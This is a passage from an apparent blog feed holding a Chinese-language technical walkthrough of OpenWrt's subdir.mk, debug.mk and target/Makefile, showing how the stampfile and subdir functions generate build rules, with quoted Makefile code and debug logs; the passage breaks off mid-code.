不过记得加上必要的全局变量，比如 <code>TOPDIR</code>, <code>SCAN_COOKIE</code> 等</li></ol>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> makefile </tag>
            
            <tag> openwrt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openwrt Makefile subdir.mk 详解</title>
      <link href="2021/01/13/mk-subdir/"/>
      <url>2021/01/13/mk-subdir/</url>
      
        <content type="html"><![CDATA[<p>之前讲述了 openwrt Makefile 的<a href="https://www.litreily.top/2020/12/30/openwrt-mkfile/">整体框架</a>，主要包括主 Makefile 的描述，，最后简单描述了 <code>subdir.mk</code> , 本文就来详细剖析这个文件。</p><p>但是在解析 <code>subdir.mk</code> 之前，先来看两个 Makefile, </p><ul><li><code>debug.mk</code>: 这也是主 Makefile 引入的第一个 .mk 文件，这里定义的调试函数在 <code>subdir.mk</code> 中被调用</li><li><code>target/Makefile</code>: 这是调用到 <code>subdir.mk</code> 的首个 Makefile, 本文将以此为例进行说明</li></ul><h2 id="debug-mk"><a href="#debug-mk" class="headerlink" title="debug.mk"></a>debug.mk</h2><p><code>debug.mk</code> 定义了几个调试函数。</p><ul><li><code>debug</code></li><li><code>warn</code></li><li><code>debug_eval</code></li><li><code>warn_eval</code></li></ul><pre><code class="makefile">define debug$$(findstring $(2),$$(if $$(DEBUG_SCOPE_DIR),$$(if $$(filter $$(DEBUG_SCOPE_DIR)%,$(1)),$(build_debug)),$(build_debug)))endefdefine warn$$(if $(call debug,$(1),$(2)),$$(warning $(3)))endefdefine debug_eval$$(if $(call debug,$(1),$(2)),$(3))endefdefine warn_eval$(call warn,$(1),$(2),$(3)        $(4))$(4)endef</code></pre><p>其中：</p><ul><li><code>DEBUG_SCOPE_DIR</code>: 默认没有定义, 可以在执行 <code>make</code> 时指定</li><li><code>build_debug</code>: 对应的是 <code>$(DEBUG)</code> 的值，是 &quot;dltvr&quot; 字符串的子集</li></ul><p>要使这几个函数生效，需要定义变量 <code>DEBUG</code>, 可以在执行 make 时定义.</p><pre><code class="bash">make DEBUG=d V=s# debug flags:## d: show subdirectory tree# t: show added targets# l: show legacy targets# r: show autorebuild messages# v: verbose (no .SILENCE for common targets)</code></pre><p>默认情况下，<code>DEBUG</code> 是没有定义的，通常不需要管，之所以在这拎出来，是因为 <code>subdir.mk</code> 有调用以上提及的调试函数。</p><h2 id="target-Makefile"><a href="#target-Makefile" class="headerlink" title="target/Makefile"></a>target/Makefile</h2><p><code>target/Makefile</code>  与 <code>tools</code>, <code>toolchain</code>, <code>package</code> 目录的 <code>Makefile</code> 使用的是相同的结构，通过调用 <code>subdir.mk</code> 内定义的两个函数 <code>stampfile</code>, <code>subdir</code> 动态生成编译目标规则。</p><pre><code class="makefile">curdir:=target$(curdir)/subtargets:=install$(curdir)/builddirs:=linux sdk imagebuilder toolchain$(curdir)/builddirs-default:=linux$(curdir)/builddirs-install:=linux $(if $(CONFIG_SDK),sdk) $(if $(CONFIG_IB),imagebuilder) $(if $(CONFIG_MAKE_TOOLCHAIN),toolchain)$(curdir)/sdk/install:=$(curdir)/linux/install$(curdir)/imagebuilder/install:=$(curdir)/linux/install$(eval $(call stampfile,$(curdir),target,prereq,.config))$(eval $(call stampfile,$(curdir),target,compile,$(TMP_DIR)/.build))$(eval $(call stampfile,$(curdir),target,install,$(TMP_DIR)/.build))$($(curdir)/stamp-install): $($(curdir)/stamp-compile) $(eval $(call subdir,$(curdir)))</code></pre><p>其中 <code>curdir</code> 代表当前目录. 该 <code>Makefile</code> 前半部分定义了一些变量，这些变量在后续的 <code>stampfile</code>, <code>subdir</code> 函数中被调用。<code>target</code>, <code>package</code> 等目录的 <code>Makefile</code> 都是先调用 <code>stampfile</code> 生成特定目标的依赖和指令，然后再调用 <code>subdir</code> 生成各个子目录下目标的编译规则。至于具体怎么生成，继续往后看。</p><h2 id="subdir-mk"><a href="#subdir-mk" class="headerlink" title="subdir.mk"></a>subdir.mk</h2><p>接下来看本文的主角 —— <code>subdir.mk</code>, 这是编译项目过程中 <strong>非常重要</strong> 的文件，它可以动态定义和生成编译子目录相关目标的规则，包括 <code>package</code>, <code>target</code>, <code>tools</code>, <code>toolchain</code> 等子目录相关目标的规则。 <code>subdir.mk</code> 也是编译生成 <code>world</code> 目标必不可少的文件，主 <code>Makefile</code> 在 <code>include subdir.mk</code> 之后会 <code>include</code> 以下 <code>Makefile</code>:</p><ul><li>target/Makefile</li><li>package/Makefile</li><li>tools/Makefile</li><li>toolchain/Makefile</li></ul><p>这些子目录的 <code>Makefile</code> 会调用 <code>subdir.mk</code> 定义的以下两个函数：</p><ul><li>subdir</li><li>stampfile</li></ul><p>这两个函数是配合起来一起用的，先通过 <code>stampfile</code> 生成 <code>stamp-$(target)</code> 相关规则，然后通过 <code>subddir</code> 生成各个子目录相关目标的规则（如 <code>target/linux/clean</code>）。</p><h3 id="stampfile"><a href="#stampfile" class="headerlink" title="stampfile"></a>stampfile</h3><p>先来看 <code>stampfile</code>.</p><pre><code class="makefile"># Parameters: &lt;subdir&gt; &lt;name&gt; &lt;target&gt; &lt;depends&gt; &lt;config options&gt; &lt;stampfile location&gt;define stampfile  $(1)/stamp-$(3):=$(if $(6),$(6),$(STAGING_DIR))/stamp/.$(2)_$(3)$(5)  $$($(1)/stamp-$(3)): $(TMP_DIR)/.build $(4)        @+$(SCRIPT_DIR)/timestamp.pl -n $$($(1)/stamp-$(3)) $(1) $(4) || \                $(MAKE) $(if $(QUIET),--no-print-directory) $$($(1)/flags-$(3)) $(1)/$(3)        @mkdir -p $$$$(dirname $$($(1)/stamp-$(3)))        @touch $$($(1)/stamp-$(3))  $$(if $(call debug,$(1),v),,.SILENT: $$($(1)/stamp-$(3)))  .PRECIOUS: $$($(1)/stamp-$(3)) # work around a make bug  $(1)//clean:=$(1)/stamp-$(3)/clean  $(1)/stamp-$(3)/clean: FORCE        @rm -f $$($(1)/stamp-$(3))endef</code></pre><p>首行注释了 <code>stampfile</code> 的参数列表，以 <code>target/Makefile</code> 首个 <code>stampfile</code> 调用为例。</p><pre><code class="makefile"># Parameters: &lt;subdir&gt; &lt;name&gt; &lt;target&gt; &lt;depends&gt; &lt;config options&gt; &lt;stampfile location&gt;$(eval $(call stampfile,$(curdir),target,prereq,.config))# subdir: $(curdir) - &quot;target&quot;# name: &quot;target&quot;# target: &quot;prereq&quot;# depends: &quot;.config&quot;# config options: &quot;&quot;# stampfile location: &quot;&quot;</code></pre><p>为了方便调试，可以在该行前添加一行, 将 <code>eval</code> 改成 <code>warning</code>，这样就可以在编译 log 中看到解析后的编译规则啦。</p><pre><code class="makefile"># add below function call to get the details of stampfile$(warning $(call stampfile,$(curdir),target,prereq,.config))$(eval $(call stampfile,$(curdir),target,prereq,.config))</code></pre><p>ok, 接下来清除 <strong>所有</strong> 编译结果，然后重新编译 <code>defconfig</code>, 编译过程就会调用 <code>target/Makefile</code> 并执行以上语句。</p><pre><code class="bash">make distcleanmake -d DEBUG=vltdr defconfig &gt; log 2&gt;&amp;1</code></pre><p>截取 log 中打印以上 <code>warning</code> 信息的部分如下：</p><pre><code class="makefile">target/stamp-prereq:=/home/litreily/openwrt/staging_dir/target-_/stamp/.target_prereq$(target/stamp-prereq): /home/litreily/openwrt/tmp/.build .config        @+/home/litreily/openwrt/scripts/timestamp.pl -n $(target/stamp-prereq) target .config || make  $(target/flags-prereq) target/prereq        @mkdir -p $$(dirname $(target/stamp-prereq))        @touch $(target/stamp-prereq)$(if $(findstring v,$(if $(DEBUG_SCOPE_DIR),$(if $(filter $(DEBUG_SCOPE_DIR)%,target),vltdr),vltdr)),,.SILENT: $(target/stamp-prereq)).PRECIOUS: $(target/stamp-prereq) # work around a make bugtarget//clean:=target/stamp-prereq/cleantarget/stamp-prereq/clean: FORCE        @rm -f $(target/stamp-prereq)</code></pre><p>由于默认没有 <code>.config</code> 文件，所以解析出来的 <code>STAGING_DIR</code> 为 <code>target-_</code>, 如果是 <code>.config</code> 已存在的情况下，得到的结果更完整，当然这不是我们研究的重点。</p><p>从以上解析结果可以看出，<code>stampfile</code> 会生成 4 个目标规则：</p><ul><li><code>$(target/stamp-prereq)</code> : 依赖 <code>tmp/.build</code>, <code>.config</code></li><li><code>.SILENT</code>: 是在没有定义 DEBUG 参数时才会生成的目标，其依赖就是刚定义的 <code>$(target/stamp-prereq)</code>, 可以忽略</li><li><code>.PRECIOUS</code>: 根据注释像是解决某个 bug 的 workaround, 可以忽略</li><li><code>target/stamp-prereq/clean</code>: 用来删除目标 <code>$(target/stamp-prereq)</code> 的伪目标</li></ul><p>根据分析，以上结果可以进一步简化。</p><pre><code class="makefile">target/stamp-prereq:=/home/litreily/openwrt/staging_dir/target-_/stamp/.target_prereq$(target/stamp-prereq): /home/litreily/openwrt/tmp/.build .config        @+/home/litreily/openwrt/scripts/timestamp.pl -n $(target/stamp-prereq) target .config || make  $(target/flags-prereq) target/prereq        @mkdir -p $$(dirname $(target/stamp-prereq))        @touch $(target/stamp-prereq)target//clean:=target/stamp-prereq/cleantarget/stamp-prereq/clean: FORCE        @rm -f $(target/stamp-prereq)</code></pre><p>同理也可以分析 <code>target/Makefile</code> 中剩余两个 <code>stampfile</code> 调用。</p><pre><code class="makefile">$(warning $(call stampfile,$(curdir),target,compile,$(TMP_DIR)/.build))$(eval $(call stampfile,$(curdir),target,compile,$(TMP_DIR)/.build))$(warning $(call stampfile,$(curdir),target,install,$(TMP_DIR)/.build))$(eval $(call stampfile,$(curdir),target,install,$(TMP_DIR)/.build))</code></pre><p>同样进行简化，得到编译目标及其规则：</p><pre><code class="makefile"># $(eval $(call stampfile,$(curdir),target,compile,$(TMP_DIR)/.build))target/stamp-compile:=/home/litreily/openwrt/staging_dir/target-mips_24kc_musl/stamp/.target_compile$(target/stamp-compile): /home/litreily/openwrt/tmp/.build /home/litreily/openwrt/tmp/.build        @+/home/litreily/openwrt/scripts/timestamp.pl -n $(target/stamp-compile) target /home/litreily/openwrt/tmp/.build || make  $(target/flags-compile) target/compile        @mkdir -p $$(dirname $(target/stamp-compile))        @touch $(target/stamp-compile)target//clean:=target/stamp-compile/cleantarget/stamp-compile/clean: FORCE        @rm -f $(target/stamp-compile)# $(eval $(call stampfile,$(curdir),target,install,$(TMP_DIR)/.build))target/stamp-install:=/home/litreily/openwrt/staging_dir/target-mips_24kc_musl/stamp/.target_install$(target/stamp-install): /home/litreily/openwrt/tmp/.build /home/litreily/openwrt/tmp/.build        @+/home/litreily/openwrt/scripts/timestamp.pl -n $(target/stamp-install) target /home/litreily/openwrt/tmp/.build || make  $(target/flags-install) target/install        @mkdir -p $$(dirname $(target/stamp-install))        @touch $(target/stamp-install)target//clean:=target/stamp-install/cleantarget/stamp-install/clean: FORCE</code></pre><blockquote><p><strong>注意：</strong> <code>$(target/stamp-compile)</code> 和 <code>$(target/stamp-install)</code> 的依赖包含两个重复的 <code>tmp/.build</code>, 看起来像是冗余的，或许可以将 <code>target/Makefile</code> 优化下。</p></blockquote><p>分析到这一步，<code>stampfile</code> 对 target 目录生成的目标已经都解析出来了，就是下面这些.</p><pre><code class="makefile">$(target/stamp-prereq):target/stamp-prereq/clean:$(target/stamp-compile):target/stamp-compile/clean:$(target/stamp-install):target/stamp-install/clean:</code></pre><p>这些目标在主 Makefile 是作为其它目标的依赖，也是目标 <code>world</code> 编译过程中的中间依赖目标。</p><blockquote><p><strong>注意：</strong> 每个 <code>stampfile</code> 除了生成目标规则都，都定义了一个 <code>target//clean</code> 变量，这个在 <code>subdir</code> 中会调用到。</p></blockquote><p>ok, <code>stampfile</code> 分析完了，接下来看下 <code>subdir</code> 要完成哪些工作。</p><h3 id="subdir"><a href="#subdir" class="headerlink" title="subdir"></a>subdir</h3><pre><code class="makefile"># Parameters: &lt;subdir&gt;define subdir  $(call warn,$(1),d,D $(1))  $(foreach bd,$($(1)/builddirs),    $(call warn,$(1),d,BD $(1)/$(bd))    $(foreach target,$(SUBTARGETS) $($(1)/subtargets),      $(foreach btype,$(buildtypes-$(bd)),        $(call warn_eval,$(1)/$(bd),t,T,$(1)/$(bd)/$(btype)/$(target): $(if $(NO_DEPS)$(QUILT),,$($(1)/$(bd)/$(btype)/$(target)) $(call $(1)//$(btype)/$(target),$(1)/$(bd)/$(btype))))                $(call log_make,$(1)/$(bd),$(target),$(btype),$(filter-out __default,$(variant))) \                        || $(call ERROR,$(2),   ERROR: $(1)/$(bd) [$(btype)] failed to build.,$(findstring $(bd),$($(1)/builddirs-ignore-$(btype)-$(target))))        $(if $(call diralias,$(bd)),$(call warn_eval,$(1)/$(bd),l,T,$(1)/$(call diralias,$(bd))/$(btype)/$(target): $(1)/$(bd)/$(btype)/$(target)))      )      $(call warn_eval,$(1)/$(bd),t,T,$(1)/$(bd)/$(target): $(if $(NO_DEPS)$(QUILT),,$($(1)/$(bd)/$(target)) $(call $(1)//$(target),$(1)/$(bd))))        $(foreach variant,$(if $(BUILD_VARIANT),$(BUILD_VARIANT),$(if $(strip $($(1)/$(bd)/variants)),$($(1)/$(bd)/variants),$(if $($(1)/$(bd)/default-variant),$($(1)/$(bd)/default-variant),__default))),                $(if $(BUILD_LOG),@mkdir -p $(BUILD_LOG_DIR)/$(1)/$(bd)/$(filter-out __default,$(variant)))                $(if $($(1)/autoremove),$(call rebuild_check,$(1)/$(bd),$(target),,$(filter-out __default,$(variant))))                $(call log_make,$(1)/$(bd),$(target),,$(filter-out __default,$(variant))) \                        || $(call ERROR,$(1),   ERROR: $(1)/$(bd) failed to build$(if $(filter-out __default,$(variant)), (build variant: $(variant))).,$(findstring $(bd),$($(1)/builddirs-ignore-$(target))))         )      $(if $(PREREQ_ONLY)$(DUMP_TARGET_DB),,        # aliases        $(if $(call diralias,$(bd)),$(call warn_eval,$(1)/$(bd),l,T,$(1)/$(call diralias,$(bd))/$(target): $(1)/$(bd)/$(target)))          )        )  )  $(foreach target,$(SUBTARGETS) $($(1)/subtargets),$(call subtarget,$(1),$(target)))endef</code></pre><p>别看这么复杂，其中很大一部分是 debug 信息，只有在 <code>DEBUG</code> 值不为空的情况下才会打印，否则就是空值。在编译的时候加上 <code>DEBUG=vltdr</code>, 可以看到以下详细的调试信息，也能方便理解。</p><pre><code class="log">target/Makefile:23: D targettarget/Makefile:23: BD target/linuxtarget/Makefile:23: T    target/linux/clean:  target/stamp-install/cleantarget/Makefile:23: T    target/linux/download:  target/Makefile:23: T    target/linux/prepare:  target/Makefile:23: T    target/linux/compile:  target/Makefile:23: T    target/linux/update:  target/Makefile:23: T    target/linux/refresh:  target/Makefile:23: T    target/linux/prereq:  target/Makefile:23: T    target/linux/dist:  target/Makefile:23: T    target/linux/distcheck:  target/Makefile:23: T    target/linux/configure:  target/Makefile:23: T    target/linux/check:  target/Makefile:23: T    target/linux/check-depends:  target/Makefile:23: T    target/linux/install:  target/Makefile:23: BD target/sdktarget/Makefile:23: T    target/sdk/clean:  target/stamp-install/cleantarget/Makefile:23: T    target/sdk/download:  target/Makefile:23: T    target/sdk/prepare:  target/Makefile:23: T    target/sdk/compile:  target/Makefile:23: T    target/sdk/update:  target/Makefile:23: T    target/sdk/refresh:  target/Makefile:23: T    target/sdk/prereq:  target/Makefile:23: T    target/sdk/dist:  target/Makefile:23: T    target/sdk/distcheck:  target/Makefile:23: T    target/sdk/configure:  target/Makefile:23: T    target/sdk/check:  target/Makefile:23: T    target/sdk/check-depends:  target/Makefile:23: T    target/sdk/install: target/linux/install target/Makefile:23: BD target/imagebuildertarget/Makefile:23: T    target/imagebuilder/clean:  target/stamp-install/cleantarget/Makefile:23: T    target/imagebuilder/download:  target/Makefile:23: T    target/imagebuilder/prepare:  target/Makefile:23: T    target/imagebuilder/compile:  target/Makefile:23: T    target/imagebuilder/update:  target/Makefile:23: T    target/imagebuilder/refresh:  target/Makefile:23: T    target/imagebuilder/prereq:  target/Makefile:23: T    target/imagebuilder/dist:  target/Makefile:23: T    target/imagebuilder/distcheck:  target/Makefile:23: T    target/imagebuilder/configure:  target/Makefile:23: T    target/imagebuilder/check:  target/Makefile:23: T    target/imagebuilder/check-depends:  target/Makefile:23: T    target/imagebuilder/install: target/linux/install target/Makefile:23: BD target/toolchaintarget/Makefile:23: T    target/toolchain/clean:  target/stamp-install/cleantarget/Makefile:23: T    target/toolchain/download:  target/Makefile:23: T    target/toolchain/prepare:  target/Makefile:23: T    target/toolchain/compile:  target/Makefile:23: T    target/toolchain/update:  target/Makefile:23: T    target/toolchain/refresh:  target/Makefile:23: T    target/toolchain/prereq:  target/Makefile:23: T    target/toolchain/dist:  target/Makefile:23: T    target/toolchain/distcheck:  target/Makefile:23: T    target/toolchain/configure:  target/Makefile:23: T    target/toolchain/check:  target/Makefile:23: T    target/toolchain/check-depends:  target/Makefile:23: T    target/toolchain/install:  target/Makefile:23: T    target/clean:  target/linux/cleantarget/Makefile:23: T    target/download:  target/linux/downloadtarget/Makefile:23: T    target/prepare:  target/linux/preparetarget/Makefile:23: T    target/compile:  target/linux/compiletarget/Makefile:23: T    target/update:  target/linux/updatetarget/Makefile:23: T    target/refresh:  target/linux/refreshtarget/Makefile:23: T    target/prereq:  target/linux/prereqtarget/Makefile:23: T    target/dist:  target/linux/disttarget/Makefile:23: T    target/distcheck:  target/linux/distchecktarget/Makefile:23: T    target/configure:  target/linux/configuretarget/Makefile:23: T    target/check:  target/linux/checktarget/Makefile:23: T    target/check-depends:  target/linux/check-dependstarget/Makefile:23: T    target/install:  target/linux/install</code></pre><p>其中：</p><ul><li><code>D</code> : Directory, 当前目录</li><li><code>BD</code> : builddirs, 在 <code>target/Makefile</code> 中定义的 <code>builddirs</code> 变量</li><li><code>T</code> : subtargets, 具体的目标</li></ul><p>结合以上调试信息可以更容易分析 <code>subdir</code> 的执行流程，函数内部主要通过 3 层 <code>foreach</code> 循环逐层遍历以下信息：</p><pre><code class="makefile">$(call warn,$(1),d,D $(1))# 1. builddirs: linux sdk imagebuilder toolchain`$(foreach bd,$($(1)/builddirs),  $(call warn,$(1),d,BD $(1)/$(bd))  # 2. subtargets: clean download prepare compile update refresh prereq dist distcheck configure check check-depends install  $(foreach target,$(SUBTARGETS) $($(1)/subtargets),     # 3. buildtypes: &quot;&quot;     $(foreach btype,$(buildtypes-$(bd)),  $(call warn_eval,$(1)/$(bd),t,T,$(1)/$(bd)/$(target): $(if $(NO_DEPS)$(QUILT),,$($(1)/$(bd)/$(target)) $(call $(1)//$(target),$(1)/$(bd))))        # 3. variant: __default        $(foreach variant, ...#...$(foreach target,$(SUBTARGETS) $($(1)/subtargets),$(call subtarget,$(1),$(target)))</code></pre><p>对其中的个别变量进行说明，<code>$(bd)</code> 对应 <code>target</code> 子目录 <code>linux</code>, <code>sdk</code> 等；<code>$(SUBTARGETS)</code> 是在 <code>rules.mk</code> 中定义的。</p><pre><code class="makefile"># include/subdir.mkSUBTARGETS:=$(DEFAULT_SUBDIR_TARGETS)# rules.mkDEFAULT_SUBDIR_TARGETS:=clean download prepare compile update refresh prereq dist distcheck configure check check-depends</code></pre><p>遍历 target 的语句是 <code>$(foreach target, $(SUBTARGETS) $(1)/subtargets)</code>, 就是说，除了上面的默认 targets 之外，还要加上 <code>$(1)/subtargets</code> 的值，对应 <code>target/Makefile</code> 中的值是 <code>install</code>. 这与上面展示的 log 是相对应的。</p><p>整体结构清楚了，但是还是不好分析，那么先根据以下原则对 <code>subdir</code> 进行精简：</p><ol><li>忽略调试信息 <code>warn</code></li><li>解析变量</li><li>解析 <code>if</code> 条件判断，仅留下有效分支</li></ol><p>举例说明，</p><ol><li><code>subdir</code> 中的 <code>buildtypes-$(bd)</code> 为空，所以其对应 <code>foreach</code> 可以直接删除;</li><li><code>BUILD_VARIANT</code> 未定义，对应 <code>if</code> 判断结果为 <code>__default</code>;</li><li><code>$(BUILD_LOG)</code> 未定义，对应 <code>if</code> 分支删除。</li><li><code>$($(1)/autoremove)</code> 未定义，对应 <code>if</code> 分支删除。</li></ol><p>根据这些规则后简化的 <code>subdir</code> 如下：</p><pre><code class="makefile"># Parameters: &lt;subdir&gt;define subdir  $(foreach bd,$($(1)/builddirs),    $(foreach target,$(SUBTARGETS) $($(1)/subtargets),      $(call warn_eval,$(1)/$(bd),t,T,$(1)/$(bd)/$(target): $(call $(1)//$(target),$(1)/$(bd)))        $(foreach variant,__default,                $(call log_make,$(1)/$(bd),$(target),,$(filter-out __default,$(variant)))         )        # aliases        $(if $(call diralias,$(bd)),$(call warn_eval,$(1)/$(bd),l,T,$(1)/$(call diralias,$(bd))/$(target): $(1)/$(bd)/$(target)))    )  )  $(foreach target,$(SUBTARGETS) $($(1)/subtargets),$(call subtarget,$(1),$(target)))endef</code></pre><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>以遍历 <code>$(bd)</code> 值为 <code>linux</code> 说明以上精简后的操作。</p><pre><code class="makefile">      $(call warn_eval,$(1)/$(bd),t,T,$(1)/$(bd)/$(target): $(call $(1)//$(target),$(1)/$(bd)))</code></pre><p>在定义了 <code>DEBUG=vltdr</code> 的情况下，以上指令会打印 target 相关信息。</p><pre><code class="log">target/Makefile:23: T    target/linux/clean:  target/stamp-install/cleantarget/Makefile:23: T    target/linux/download:  target/Makefile:23: T    target/linux/prepare:  target/Makefile:23: T    target/linux/compile:  target/Makefile:23: T    target/linux/update:  target/Makefile:23: T    target/linux/refresh:  target/Makefile:23: T    target/linux/prereq:  target/Makefile:23: T    target/linux/dist:  target/Makefile:23: T    target/linux/distcheck:  target/Makefile:23: T    target/linux/configure:  target/Makefile:23: T    target/linux/check:  target/Makefile:23: T    target/linux/check-depends:  target/Makefile:23: T    target/linux/install:  </code></pre><p>从前面 <code>warn_eval</code> 的定义可知，它除了打印 warning 信息外，还会将最后一个参数单独执行一遍。所以它包含两个功能，<code>warn</code> 和 <code>eval</code>, 且 <code>eval</code> 更重要。它实际上也定义了一组编译目标。也就是 <code>warn_eval</code> 的第4个参数:</p><pre><code class="makefile">$(1)/$(bd)/$(target): $(call $(1)//$(target),$(1)/$(bd))</code></pre><p>将变量依次替换得到：</p><pre><code class="makefile">target/linux/clean: $(call target//clean,target/linux)</code></pre><ul><li><code>$(target/linux)</code> : 变量没有定义</li><li><code>$(target//clean)</code> : 前面 <code>stampfile</code> 定义的变量，其值为 <code>target/stamp-install/clean</code></li></ul><p>最终解析出来如下：</p><pre><code class="makefile">target/linux/clean: target/stamp-install/clean</code></pre><p>该目标除了依赖之外，还有对应的指令，也就是紧随其后的 <code>foreach</code> 语句。</p><pre><code class="makefile">        $(foreach variant,__default,                $(call log_make,$(1)/$(bd),$(target),,$(filter-out __default,$(variant)))         )</code></pre><p>看到这应该明了了，就是这个 <code>log_make</code> 调用，顺藤摸瓜，来看下这个函数的定义。</p><pre><code class="makefile">subdir_make_opts = \        -r -C $(1) \                BUILD_SUBDIR=&quot;$(1)&quot; \                BUILD_VARIANT=&quot;$(4)&quot;# 1: subdir# 2: target# 3: build type# 4: build variantlog_make = \        $(if $(call debug,$(1),v),,@)+ \        $(if $(BUILD_LOG), \                set -o pipefail; \                mkdir -p $(BUILD_LOG_DIR)/$(1)$(if $(4),/$(4));) \      $(SCRIPT_DIR)/time.pl &quot;time: $(1)$(if $(4),/$(4))/$(if $(3),$(3)-)$(2)&quot; \      $$(SUBMAKE) $(subdir_make_opts) $(if $(3),$(3)-)$(2) \                $(if $(BUILD_LOG),SILENT= 2&gt;&amp;1 | tee $(BUILD_LOG_DIR)/$(1)$(if $(4),/$(4))/$(if $(3),$(3)-)$(2).txt)</code></pre><p>同样，先进行简化，<code>DEBUG</code>, <code>BUILD_LOG</code> 均未定义, 对应分支可删除；已知全局变量可以替换掉。</p><pre><code class="makefile">log_make = \        @+ \        scripts/time.pl &quot;time: $(1)$(if $(4),/$(4))/$(if $(3),$(3)-)$(2)&quot; \        $$(SUBMAKE) -r -C $(1) BUILD_SUBDIR=&quot;$(1)&quot; BUILD_VARIANT=&quot;$(4)&quot; \        $(if $(3),$(3)-)$(2)</code></pre><p>接着回到 <code>subdir</code> 中的 <code>log_make</code> 的调用处：</p><pre><code class="makefile">$(call log_make,$(1)/$(bd),$(target),,$(filter-out __default,$(variant))) </code></pre><p>按照简化后的 <code>log_make</code> 代入参数解析以上指令。</p><pre><code class="makefile">+ scripts/time.pl &quot;time: target/linux/clean&quot; make -w -r -C target/linux BUILD_SUBDIR=&quot;target/linux&quot; BUILD_VARIANT=&quot;&quot; clean</code></pre><p>将目标、依赖及其指令组合起来就是这样的：</p><pre><code class="makefile">target/linux/clean: target/stamp-install/clean        + scripts/time.pl &quot;time: target/linux/clean&quot; make -w -r -C target/linux BUILD_SUBDIR=&quot;target/linux&quot; BUILD_VARIANT=&quot;&quot; clean</code></pre><p>看看这个目标定义，依赖项 <code>target/stamp-install/clean</code> 的规则在 <code>stampfile</code> 中定义好了；其指令是通过 perl 脚本 <code>time.pl</code> 执行 <code>make</code> 指令并记录时间信息。</p><p>到此就完成了对 <code>subdir</code> 遍历 <code>subtargets</code> 之一 <code>target/linux/clean</code> 的解析，其它 <code>target</code> 也是类似的。</p><pre><code class="makefile"># target/linuxtarget/linux/clean: target/stamp-install/clean        + scripts/time.pl &quot;time: target/linux/clean&quot; make -w -r -C target/linux BUILD_SUBDIR=&quot;target/linux&quot; BUILD_VARIANT=&quot;&quot; cleantarget/linux/download:         + scripts/time.pl &quot;time: target/linux/download&quot; make -w -r -C target/linux BUILD_SUBDIR=&quot;target/linux&quot; BUILD_VARIANT=&quot;&quot; downloadtarget/linux/prepare:         + scripts/time.pl &quot;time: target/linux/download&quot; make -w -r -C target/linux BUILD_SUBDIR=&quot;target/linux&quot; BUILD_VARIANT=&quot;&quot; prepare#...target/linux/install:         + scripts/time.pl &quot;time: target/linux/install&quot; make -w -r -C target/linux BUILD_SUBDIR=&quot;target/linux&quot; BUILD_VARIANT=&quot;&quot; install# target/sdktarget/sdk/clean: target/stamp-install/clean        + scripts/time.pl &quot;time: target/sdk/clean&quot; make -w -r -C target/sdk BUILD_SUBDIR=&quot;target/sdk&quot; BUILD_VARIANT=&quot;&quot; cleantarget/sdk/download:         + scripts/time.pl &quot;time: target/sdk/download&quot; make -w -r -C target/sdk BUILD_SUBDIR=&quot;target/sdk&quot; BUILD_VARIANT=&quot;&quot; download#...target/sdk/install:         + scripts/time.pl &quot;time: target/sdk/install&quot; make -w -r -C target/sdk BUILD_SUBDIR=&quot;target/sdk&quot; BUILD_VARIANT=&quot;&quot; install# target/imagebuildertarget/imagebuilder/clean: target/stamp-install/clean        + scripts/time.pl &quot;time: target/imagebuilder/clean&quot; make -w -r -C target/imagebuilder BUILD_SUBDIR=&quot;target/imagebuilder&quot; BUILD_VARIANT=&quot;&quot; cleantarget/imagebuilder/download:         + scripts/time.pl &quot;time: target/imagebuilder/download&quot; make -w -r -C target/imagebuilder BUILD_SUBDIR=&quot;target/imagebuilder&quot; BUILD_VARIANT=&quot;&quot; download#...target/imagebuilder/install:         + scripts/time.pl &quot;time: target/imagebuilder/install&quot; make -w -r -C target/imagebuilder BUILD_SUBDIR=&quot;target/imagebuilder&quot; BUILD_VARIANT=&quot;&quot; install# target/toolchaintarget/toolchain/clean: target/stamp-install/clean        + scripts/time.pl &quot;time: target/toolchain/clean&quot; make -w -r -C target/toolchain BUILD_SUBDIR=&quot;target/toolchain&quot; BUILD_VARIANT=&quot;&quot; cleantarget/toolchain/download:         + scripts/time.pl &quot;time: target/toolchain/download&quot; make -w -r -C target/toolchain BUILD_SUBDIR=&quot;target/toolchain&quot; BUILD_VARIANT=&quot;&quot; download#...target/toolchain/install:         + scripts/time.pl &quot;time: target/toolchain/install&quot; make -w -r -C target/toolchain BUILD_SUBDIR=&quot;target/toolchain&quot; BUILD_VARIANT=&quot;&quot; install</code></pre><h3 id="in-the-end"><a href="#in-the-end" class="headerlink" title="in the end"></a>in the end</h3><p>最后，还有一个小尾巴没讲到。注意看前面给出 log 的最后一部分。</p><pre><code class="log">target/Makefile:23: T    target/clean:  target/linux/cleantarget/Makefile:23: T    target/download:  target/linux/downloadtarget/Makefile:23: T    target/prepare:  target/linux/preparetarget/Makefile:23: T    target/compile:  target/linux/compiletarget/Makefile:23: T    target/update:  target/linux/updatetarget/Makefile:23: T    target/refresh:  target/linux/refreshtarget/Makefile:23: T    target/prereq:  target/linux/prereqtarget/Makefile:23: T    target/dist:  target/linux/disttarget/Makefile:23: T    target/distcheck:  target/linux/distchecktarget/Makefile:23: T    target/configure:  target/linux/configuretarget/Makefile:23: T    target/check:  target/linux/checktarget/Makefile:23: T    target/check-depends:  target/linux/check-dependstarget/Makefile:23: T    target/install:  target/linux/install</code></pre><p>这里打印的信息是哪里来的呢？其实也是 <code>subdir</code> 函数，是该函数最后一个 <code>foreach</code> 循环遍历出来的。</p><pre><code class="makefile">  $(foreach target,$(SUBTARGETS) $($(1)/subtargets),$(call subtarget,$(1),$(target)))</code></pre><p>经过前面的推导，这部分简直是小 case, 无非是遍历所有 <code>target</code>, 然后使用函数 <code>subtarget</code> 去生成规则。</p><pre><code class="makefile">subtarget-default = $(filter-out ., \        $(if $($(1)/builddirs-$(2)),$($(1)/builddirs-$(2)), \        $(if $($(1)/builddirs-default),$($(1)/builddirs-default), \        $($(1)/builddirs))))define subtarget  $(call warn_eval,$(1),t,T,$(1)/$(2): $($(1)/) $(foreach bd,$(call subtarget-default,$(1),$(2)),$(1)/$(bd)/$(2)))endef</code></pre><p>同样对其进行简化。</p><pre><code class="makefile"># $(1): target# $(2): $(target) -&gt; &quot;clean, download, ..., install&quot;# $(target/builddirs-clean): &quot;&quot;# $(target/builddirs-default): linux # defined in target/Makefilesubtarget-default = $(filter-out ., $(if 